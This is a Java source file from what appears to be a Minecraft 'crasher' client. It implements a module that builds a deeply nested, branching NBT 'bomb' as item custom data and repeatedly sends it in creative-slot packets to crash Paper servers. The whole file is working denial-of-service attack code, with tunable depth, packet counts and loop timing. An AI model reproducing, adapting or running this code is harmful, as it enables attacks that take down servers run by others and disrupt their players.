package me.dannycrasher.client.module.impl.paper;

import com.viaversion.viafabricplus.ViaFabricPlus;
import java.util.concurrent.ScheduledExecutorService;
import me.dannycrasher.client.command.ArgumentType;
import me.dannycrasher.client.module.Module;
import me.dannycrasher.client.module.ModuleContext;
import me.dannycrasher.client.module.ModuleType;
import me.dannycrasher.client.protocol.components.data.DataComponents;
import me.dannycrasher.client.protocol.components.data.impl.DataCustomData;
import me.dannycrasher.client.protocol.components.objects.ItemStack;
import me.dannycrasher.client.protocol.components.objects.ItemType;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.Tag;

public class CreativeCustomData extends Module {
	private ScheduledExecutorService executorService;

	public CreativeCustomData() {
		super("CreativeCustomData", "Paper creative-slot custom_data NBT bomb (requires creative)", ModuleType.PAPER);
		addArgument("packets", ArgumentType.INT, 1, 100, "50");
		addArgument("nbtDepth", ArgumentType.INT, 1, 48, "24");
		addArgument("branchSize", ArgumentType.INT, 1, 32, "8");
		addArgument("slot", ArgumentType.INT, 0, 45, "36");
		addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1000");
		addArgument("loopAmount", ArgumentType.INT, 1, 30, "10");
	}

	@Override
	public void executeModule(ModuleContext context) {
		int packets = context.getInt("packets");
		int nbtDepth = context.getInt("nbtDepth");
		int branchSize = context.getInt("branchSize");
		int slot = context.getInt("slot");
		int threadSleep = context.getInt("threadSleep");
		int loopAmount = context.getInt("loopAmount");

		int protocol = ViaFabricPlus.getImpl().getTargetVersion().getVersion();
		DataComponents components = new DataComponents();
		components.put(new DataCustomData(buildBomb(nbtDepth, branchSize)));
		ItemStack item = new ItemStack(ItemType.STONE.getId(protocol), 1, components);

		executorService = CreativeAttackHelper.start(this, context, executorService, packets, threadSleep, loopAmount, slot, item);
	}

	private static Tag buildBomb(int depth, int branchSize) {
		CompoundTag root = new CompoundTag();
		CompoundTag current = root;
		for (int level = 0; level < depth; level++) {
			ListTag branches = new ListTag();
			for (int branch = 0; branch < branchSize; branch++) {
				CompoundTag node = new CompoundTag();
				node.putString("k" + branch, "v".repeat(Math.min(32, depth)));
				branches.add(node);
			}
			current.put("list", branches);
			CompoundTag next = new CompoundTag();
			current.put("next", next);
			current = next;
		}
		current.putString("leaf", "X".repeat(Math.min(depth * 4, 256)));
		return root;
	}

	@Override
	public void onDisconnect() {
		super.onDisconnect();
		CreativeAttackHelper.shutdown(executorService);
	}
}
